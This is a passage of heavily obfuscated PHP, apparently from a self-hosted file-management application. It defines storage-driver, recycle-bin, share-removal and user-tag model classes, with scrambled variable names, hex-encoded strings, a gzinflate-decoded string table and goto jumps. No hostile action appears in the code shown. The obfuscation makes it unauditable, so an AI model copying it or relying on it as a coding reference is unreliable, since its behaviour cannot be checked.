(!$œ©äş§ò->isParentOf($é¨¹”ª, $ŒüÉ±™ƒ)) { continue; } $±İòŒ¡ = $œ©äş§ò->sourceInfo($ŒüÉ±™ƒ); if ($±İòŒ¡[$Ù¸†Â—[415]] == $Ù¸†Â—[97]) { $Í£õİ‚ä[] = array($Ù¸†Â—[588] => array($Ù¸†Â—[548], $±İòŒ¡[$Ù¸†Â—[525]] . $ŒüÉ±™ƒ . $Ù¸†Â—[549])); } else { $Í£õİ‚ä[$Ù¸†Â—[407]][1][] = $ŒüÉ±™ƒ; } } if (!$Í£õİ‚ä[$Ù¸†Â—[407]][1]) { unset($Í£õİ‚ä[$Ù¸†Â—[407]]); } if (!$Í£õİ‚ä) { return; } $Í£õİ‚ä[$Ù¸†Â—[407]][1] = array_unique($Í£õİ‚ä[$Ù¸†Â—[407]][1]); $Í£õİ‚ä[$Ù¸†Â—[992]] = $Ù¸†Â—[1837]; $œ©äş§ò->where($Í£õİ‚ä)->setField($Ù¸†Â—[435], 1); } private function recycleMove($˜Ó¥–‡Æ, $ğú»¯òî = 1) { $Á­ŞÏ =& $_SERVER[Á÷ ­Šë]; $ŞÂ“â ® = Model($Á­ŞÏ[1249]); $ˆ¥‡ãø = Model($Á­ŞÏ[2042]); $ĞèÛ‹ˆ = array($Á­ŞÏ[407] => $˜Ó¥–‡Æ); if ($ğú»¯òî) { $ŞÂ“â ®->where($ĞèÛ‹ˆ)->setField($Á­ŞÏ[435], 1); $ˆ¥‡ãø->eventRecycle($˜Ó¥–‡Æ, $Á­ŞÏ[2043]); } else { $‰¤›Å¡Ë = $ŞÂ“â ®->where($ĞèÛ‹ˆ)->find(); $÷˜ÍğäÚ = $‰¤›Å¡Ë[$Á­ŞÏ[415]] == $Á­ŞÏ[97]; $Âªïİ’€ = $ŞÂ“â ®->fileNameAuto($‰¤›Å¡Ë[$Á­ŞÏ[502]], $‰¤›Å¡Ë[$Á­ŞÏ[28]], REPEAT_RENAME_FOLDER, $÷˜ÍğäÚ); if ($Âªïİ’€ != $‰¤›Å¡Ë[$Á­ŞÏ[28]]) { $ŞÂ“â ®->rename($˜Ó¥–‡Æ, $Âªïİ’€); } $ŞÂ“â ®->where($ĞèÛ‹ˆ)->setField($Á­ŞÏ[435], 0); $ˆ¥‡ãø->eventRecycle($˜Ó¥–‡Æ, $Á­ŞÏ[2044]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\163\x6f\x75\162\143\x65\123\145\x63\162\145\164\x4c\151\163\164"; public $field = array("\163\x6f\x75\x72\143\145\x49\x44", "\164\x79\x70\145\x49\104", "\143\x72\145\141\164\x65\125\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\163\x74\157\x72\x61\147\x65\114\x69\x73\x74"; public $field = array("\156\x61\155\145", "\163\151\172\145\x4d\x61\170", "\x73\x79\x73\164\x65\x6d", "\144\145\x66\141\x75\154\164", "\x64\162\x69\x76\x65\x72", "\143\157\156\146\x69\147"); public function listData($Í”ùî—å = false, $õ˜Ø…öĞ = "\x6d\x6f\x64\151\146\171\x54\151\x6d\x65", $¬£ƒ’âµ = false) { $¢²Ş¶¼¦ =& $_SERVER[Á÷ ­Šë]; $ä¦‰ë² = parent::listData($Í”ùî—å, $õ˜Ø…öĞ, $¬£ƒ’âµ); if ($Í”ùî—å) { return $ä¦‰ë²; } $ƒç¤€· = $this->ioSizeUseGet(array_to_keyvalue($ä¦‰ë², $¢²Ş¶¼¦[33], $¢²Ş¶¼¦[404])); foreach ($ä¦‰ë² as $í¿ ÌØ¿ => $ˆÈñï‘à) { unset($ä¦‰ë²[$í¿ ÌØ¿][$¢²Ş¶¼¦[6]]); $ä¦‰ë²[$í¿ ÌØ¿][$¢²Ş¶¼¦[1730]] = isset($ƒç¤€·[$ˆÈñï‘à[$¢²Ş¶¼¦[404]]]) ? $ƒç¤€·[$ˆÈñï‘à[$¢²Ş¶¼¦[404]]] : 0; } return $ä¦‰ë²; } public function ioSizeUseGet($šòË”‡ó) { $ÆÃ¹âäó =& $_SERVER[Á÷ ­Šë]; if (!$šòË”‡ó) { return array(); } $ıøçÆïà = $ÆÃ¹âäó[2045] . implode($ÆÃ¹âäó[47], $šòË”‡ó); $›ÒÏÚ€ğ = Cache::get($ıøçÆïà); if ($›ÒÏÚ€ğ) { return $›ÒÏÚ€ğ; } $¬£Ó”ëÚ = array($ÆÃ¹âäó[819] => $ÆÃ¹âäó[404], $ÆÃ¹âäó[2046] => $ÆÃ¹âäó[88]); $¾«æèÓŒ = array($ÆÃ¹âäó[819] => array($ÆÃ¹âäó[7], $šòË”‡ó)); $›ÒÏÚ€ğ = Model($ÆÃ¹âäó[782])->field($¬£Ó”ëÚ)->where($¾«æèÓŒ)->group($ÆÃ¹âäó[819])->select(); $›ÒÏÚ€ğ = array_to_keyvalue($›ÒÏÚ€ğ, $ÆÃ¹âäó[404], $ÆÃ¹âäó[88]); Cache::set($ıøçÆïà, $›ÒÏÚ€ğ, 600); return $›ÒÏÚ€ğ; } public function getConfig($ Ûù) { $ƒÏšÑäÏ = parent::listData($ Ûù); return json_decode($ƒÏšÑäÏ[$_SERVER[Á÷ ­Šë][6]], !0); } public function update($ °ôó°, $Ãå§‰…) { $ ³­İ¡è =& $_SERVER[Á÷ ­Šë]; $×˜±£Û = $Ãå§‰…[$ ³­İ¡è[28]]; $…Š’Ç±† = array_to_keyvalue(parent::listData(), $ ³­İ¡è[28]); if (isset($…Š’Ç±†[$×˜±£Û]) && $…Š’Ç±†[$×˜±£Û][$ ³­İ¡è[404]] != $ °ôó°) { return !1; } if (isset($Ãå§‰…[$ ³­İ¡è[2047]]) && $Ãå§‰…[$ ³­İ¡è[2047]] == $ ³­İ¡è[97]) { $this->checkConfig($Ãå§‰…); } unset($Ãå§‰…[$ ³­İ¡è[2047]]); $ä„İ–ÎŞ = parent::update($ °ôó°, $Ãå§‰…); if ($ä„İ–ÎŞ && $Ãå§‰…[$ ³­İ¡è[34]]) { foreach ($…Š’Ç±† as $öÎ“™‘À) { if ($öÎ“™‘À[$ ³­İ¡è[34]] && $öÎ“™‘À[$ ³­İ¡è[404]] != $ °ôó°) { parent::update($öÎ“™‘À[$ ³­İ¡è[404]], array($ ³­İ¡è[34] => 0)); } } } return $ä„İ–ÎŞ; } public function add($Í‹Ä¬²) { $úû¯ë… =& $_SERVER[Á÷ ­Šë]; $“˜‹±èÔ = array_to_keyvalue(parent::listData(), $úû¯ë…[28]); if (isset($“˜‹±èÔ[$Í‹Ä¬²[$úû¯ë…[28]]])) { return !1; } $this->checkConfig($Í‹Ä¬²); $÷—œ– = parent::insert($Í‹Ä¬²); if ($÷—œ– && $Í‹Ä¬²[$úû¯ë…[34]]) { foreach ($“˜‹±èÔ as $ÅŞ¨®åÔ) { if ($ÅŞ¨®åÔ[$úû¯ë…[34]]) { parent::update($ÅŞ¨®åÔ[$úû¯ë…[404]], array($úû¯ë…[34] => 0)); } } } return $÷—œ–; } public function checkConfig(&$ˆûø¤ì‚, $£·ñ¯Ï = false) { $şî¤­êõ =& $_SERVER[Á÷ ­Šë]; $µÔª¼ôû = strtolower($ˆûø¤ì‚[$şî¤­êõ[104]]); $éÇ€¬²÷ = json_decode($ˆûø¤ì‚[$şî¤­êõ[6]], !0); foreach ($éÇ€¬²÷ as $ÈµĞû‡ => $üÖÈÁşş) { $éÇ€¬²÷[$ÈµĞû‡] = trim($üÖÈÁşş); } $éÇ€¬²÷[$şî¤­êõ[2048]] = rand_string(6); $§®×ØßÅ = $GLOBALS[$şî¤­êõ[6]][$şî¤­êõ[98]][$şî¤­êõ[828]]; $ÖóË°Ì¸ = isset($§®×ØßÅ[$µÔª¼ôû]) ? $§®×ØßÅ[$µÔª¼ôû] : ucfirst($µÔª¼ôû); $´ç¢˜Â¡ = $şî¤­êõ[82] . $ÖóË°Ì¸; if (!$ÖóË°Ì¸ || !class_exists($´ç¢˜Â¡)) { if ($£·ñ¯Ï) { return LNG($şî¤­êõ[2049]); } write_log(array($şî¤­êõ[2050], $ˆûø¤ì‚, get_caller_info()), $şî¤­êõ[2051]); show_json(LNG($şî¤­êõ[2049]), !1, $ˆûø¤ì‚); } $¿ıé³¿Î = new $´ç¢˜Â¡($éÇ€¬²÷); if (in_array($µÔª¼ôû, $¿ıé³¿Î->objectDriver)) { if (!$¿ıé³¿Î->isBucketCors() && !$¿ıé³¿Î->setBucketCors()) { $€¯øè ñ = LNG($şî¤­êõ[2052]); $€¯øè ñ .= $şî¤­êõ[2053] . LNG($şî¤­êõ[2054]); if ($£·ñ¯Ï) { return $€¯øè ñ; } show_json($€¯øè ñ, !1); } } $à”ˆˆ“´ = rtrim($éÇ€¬²÷[$şî¤­êõ[1107]], $şî¤­êõ[8]) . $şî¤­êõ[8]; $¼¬âÏ = $¿ıé³¿Î->getPath($à”ˆˆ“´ . $şî¤­êõ[1169]); if (!$¿ıé³¿Î->mkfile($¼¬âÏ)) { if ($£·ñ¯Ï) { return LNG($şî¤­êõ[2052]); } show_json(LNG($şî¤­êõ[2052]), !1); } $éÇ€¬²÷[$şî¤­êõ[1107]] = $à”ˆˆ“´; $ˆûø¤ì‚[$şî¤­êõ[6]] = json_encode($éÇ€¬²÷); $ˆûø¤ì‚[$şî¤­êõ[104]] = $ÖóË°Ì¸; return !0; } public function driverListSystem() { $…ï°¨ =& $_SERVER[Á÷ ­Šë]; $ÅÕ³ˆÌ = parent::listData(); $±¥ˆíÏ = array(); foreach ($ÅÕ³ˆÌ as $“àÄ…ÛÀ) { unset($“àÄ…ÛÀ[$…ï°¨[204]], $“àÄ…ÛÀ[$…ï°¨[94]]); $“àÄ…ÛÀ[$…ï°¨[6]] = json_decode($“àÄ…ÛÀ[$…ï°¨[6]], !0); $±¥ˆíÏ[] = $“àÄ…ÛÀ; } return $±¥ˆíÏ; } public function defaultDriver() { $„áç ÉÌ =& $_SERVER[Á÷ ­Šë]; $èÕ£«Û‡ = parent::listData(); $ı‰…öÉ = array_filter_by_field($èÕ£«Û‡, $„áç ÉÌ[34], 1); $ı‰…öÉ = $ı‰…öÉ[0]; if ($ı‰…öÉ) { $ı‰…öÉ[$„áç ÉÌ[6]] = json_decode($ı‰…öÉ[$„áç ÉÌ[6]], !0); } return $ı‰…öÉ; } public function driverInfo($áœğè˜·) { $­Êö¼ËÓ =& $_SERVER[Á÷ ­Šë]; $Ï¬ÎªŠ¬ = array_to_keyvalue(parent::listData(), $­Êö¼ËÓ[404]); if (!isset($Ï¬ÎªŠ¬[$áœğè˜·])) { return !1; } $¨«›­—Ş = $Ï¬ÎªŠ¬[$áœğè˜·]; $¨«›­—Ş[$­Êö¼ËÓ[6]] = json_decode($¨«›­—Ş[$­Êö¼ËÓ[6]], !0); return $¨«›­—Ş; } public function remove($êÏéÇŞ‹) { $this->removeShareItems($êÏéÇŞ‹); return parent::remove($êÏéÇŞ‹); } public function removeWithFile($†ªÅ©‘µ, $ß¿Èç™š) { $ßªåäç³ =& $_SERVER[Á÷ ­Šë]; $‘¥ıò×™ = array($ßªåäç³[819] => $†ªÅ©‘µ); $“æöóùÃ = Model($ßªåäç³[474])->where($‘¥ıò×™)->count(); $ÍØ²½º» = Model($ßªåäç³[474])->where($‘¥ıò×™)->sum($ßªåäç³[88]); $š«ƒõ ‘ = $ß¿Èç™š . $ßªåäç³[2055] . $†ªÅ©‘µ; $âÂƒ…âš = new TaskFileTransfer($š«ƒõ ‘, $ßªåäç³[2051], $“æöóùÃ, LNG($ßªåäç³[2056]) . "\x28{$†ªÅ©‘µ}\x29"); $âÂƒ…âš->task[$ßªåäç³[758]] = (double) $ÍØ²½º»; $Ğ´ÕÉâ = KodIO::defaultDriver(); $Õ¤ºœ¶ˆ = $Ğ´ÕÉâ[$ßªåäç³[404]]; $úğÇ”´Æ = "\173\151\x6f\72{$Õ¤ºœ¶ˆ}\x7d\x2f"; $¾óß§ä® = !0; $ıÅÌÓßé = array(); $š¶§ò¾ = Model($ßªåäç³[203])->where($‘¥ıò×™)->field($ßªåäç³[2057])->select(); foreach ($š¶§ò¾ as $úÂ¤–¨) { $ñ½û·…Í = $úÂ¤–¨[$ßªåäç³[86]]; $ß½Ú„®© = $úğÇ”´Æ . str_replace("\173\x69\157\x3a{$†ªÅ©‘µ}\175\x2f", $ßªåäç³[33], $ñ½û·…Í); if (!IO::exist($ñ½û·…Í)) { $ıÅÌÓßé[] = $úÂ¤–¨[$ßªåäç³[471]]; $âÂƒ…âš->updateFileEnd($úÂ¤–¨[$ßªåäç³[28]], $úÂ¤–¨[$ßªåäç³[88]]); continue; } if (IO::exist($ß½Ú„®©)) { $âÂƒ…âš->updateFileEnd($úÂ¤–¨[$ßªåäç³[28]], $úÂ¤–¨[$ßªåäç³[88]]); continue; } if (!IO::move($ñ½û·…Í, get_path_father($ß½Ú„®©))) { $¾óß§ä® = !1; break; } $‘¥ıò×™ = array($ßªåäç³[471] => $úÂ¤–¨[$ßªåäç³[471]]); $²šëÎ­š = array($ßªåäç³[819] => $Õ¤ºœ¶ˆ, $ßªåäç³[86] => $ß½Ú„®©); Model($ßªåäç³[203])->where($‘¥ıò×™)->save($²šëÎ­š); } $this->removeByFileID($ıÅÌÓßé); if (!$¾óß§ä®) { $âÂƒ…âš->stop($š«ƒõ ‘); return !1; } $âÂƒ…âš->end(); if ($ß¿Èç™š == $ßªåäç³[1710]) { $this->remove($†ªÅ©‘µ); } } public function progress($Òô‡ïü, $ûõÇ‘ø) { return Task::get($ûõÇ‘ø . $_SERVER[Á÷ ­Šë][2055] . $Òô‡ïü); } private function removeByFileID($»¶´ú”— = array()) { $™¤ßÏˆä =& $_SERVER[Á÷ ­Šë]; if (empty($»¶´ú”—)) { return; } $Ëé½şÎÔ = array($™¤ßÏˆä[471] => array($™¤ßÏˆä[7], $»¶´ú”—)); $õ¢û«ÎÄ = Model($™¤ßÏˆä[1249])->where($Ëé½şÎÔ)->field($™¤ßÏˆä[407])->select(); if (!$õ¢û«ÎÄ) { return; } $õ¢û«ÎÄ = array_to_keyvalue($õ¢û«ÎÄ, $™¤ßÏˆä[33], $™¤ßÏˆä[407]); foreach ($õ¢û«ÎÄ as $ÓÛŸ¨Ÿ®) { Model($™¤ßÏˆä[421])->removeNow($ÓÛŸ¨Ÿ®, !1); } } private function removeShareItems($Ëîô«Äò) { $¦£øİ—ˆ =& $_SERVER[Á÷ ­Šë]; $¡½ÉËÊ‡ = "\173\151\x6f\x3a{$Ëîô«Äò}\x7d\57"; $Ü´¶¦ó = array($¦£øİ—ˆ[407] => 0, $¦£øİ—ˆ[1102] => array($¦£øİ—ˆ[390], "{$¡½ÉËÊ‡}\45")); $Í«Ù½Ø’ = Model($¦£øİ—ˆ[1721])->where($Ü´¶¦ó)->field($¦£øİ—ˆ[492])->select(); if (empty($Í«Ù½Ø’)) { return; } $¿ÇÈ¼É¢ = array_to_keyvalue($Í«Ù½Ø’, $¦£øİ—ˆ[33], $¦£øİ—ˆ[492]); Model($¦£øİ—ˆ[599])->remove($¿ÇÈ¼É¢); } } goto cæËºŒ¬Ñ¥; a®½±±Ç“»: $_SERVER[š¿ˆÑø] = explode($_SERVER[Á÷ ­Šë][611], gzinflate(substr($_SERVER[Á÷ ­Šë][612], 10, -8))); $ktfemusdpa = $_SERVER[Á÷ ­Šë][613]; if (strlen($ktfemusdpa) < $_SERVER[Á÷ ­Šë][614]) { return; } goto dÎ¦˜ØÇÄƒ; BâÃñ˜øŞŞ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($²‘©§¡ï) { $Ü¥–³ =& $_SERVER[Á÷ ­Šë]; return array($Ü¥–³[1852] => array(USER_ID, $Ü¥–³[1853])); } protected function listData() { $®ş¬¨œ =& $_SERVER[Á÷ ­Šë]; $ÀÖ¼Ùİ = array($®ş¬¨œ[1565] => USER_ID, $®ş¬¨œ[487] => array($®ş¬¨œ[1856], 0)); $ı×£¥ë’ = $®ş¬¨œ[1858]; $¹¿¸Œú€ = $this->field($ı×£¥ë’)->where($ÀÖ¼Ùİ)->order($®ş¬¨œ[1859])->select(); return $¹¿¸Œú€ ? $¹¿¸Œú€ : array(); } protected function listByTag($¾½—âöŞ) { } protected function addToTag($¦üè±À©, $¹àã­İ÷) { $Ÿ¥å´€¡ =& $_SERVER[Á÷ ­Šë]; if (!Model($Ÿ¥å´€¡[1992])->listData($¹àã­İ÷) || !Model($Ÿ¥å´€¡[827])->pathInfo($¦üè±À©)) { return !1; } $ÇĞşŒÁä = array($Ÿ¥å´€¡[1565] => USER_ID, $Ÿ¥å´€¡[487] => $¹àã­İ÷, $Ÿ¥å´€¡[426] => $¦üè±À©, $Ÿ¥å´€¡[427] => $Ÿ¥å´€¡[421], $Ÿ¥å´€¡[425] => $Ÿ¥å´€¡[33], $Ÿ¥å´€¡[1746] => 0); if ($this->where($ÇĞşŒÁä)->find()) { return !1; } return $this->add($ÇĞşŒÁä); } protected function removeFromTag($í¼ı½œÀ, $…œ³óç”) { $íÙ‹ÚµÈ =& $_SERVER[Á÷ ­Šë]; if (!Model($íÙ‹ÚµÈ[1992])->listData($…œ³óç”)) { return !1; } if (is_array($í¼ı½œÀ)) { $í¼ı½œÀ = array($íÙ‹ÚµÈ[7], $í¼ı½œÀ); } $§ú¯ĞŞÄ = array($íÙ‹ÚµÈ[1565] => USER_ID, $íÙ‹ÚµÈ[487] => $…œ³óç”, $íÙ‹ÚµÈ[427] => $íÙ‹ÚµÈ[421], $íÙ‹ÚµÈ[426] => $í¼ı½œÀ); return $this->where($§ú¯ĞŞÄ)->delete(); } protected function removeByTag($ç”ªôğâ) { $é¥Ë»š‹ =& $_SERVER[Á÷ ­Šë]; if (!$ç”ªôğâ) { return !1; } $ãÔãÓ± = array($é¥Ë»š‹[1565] => USER_ID, $é¥Ë»š‹[487] => $ç”ªôğâ); return $this->where($ãÔãÓ±)->delete(); } protected function removeBySource($•¯Ô™İ) { $†é¢„Ì– =& $_SERVER[Á÷ ­Šë]; if (is_array($•¯Ô™İ)) { $•¯Ô™İ = array($†é¢„Ì–[7], $•¯Ô™İ); } $ıÑË£Ø÷ = array($†é¢„Ì–[1565] => USER_ID, $†é¢„Ì–[426] => $•¯Ô™İ, $†é¢„Ì–[487] => array($†é¢„Ì–[1006], 0)); return $this->where($ıÑË£Ø÷)->delete(); } }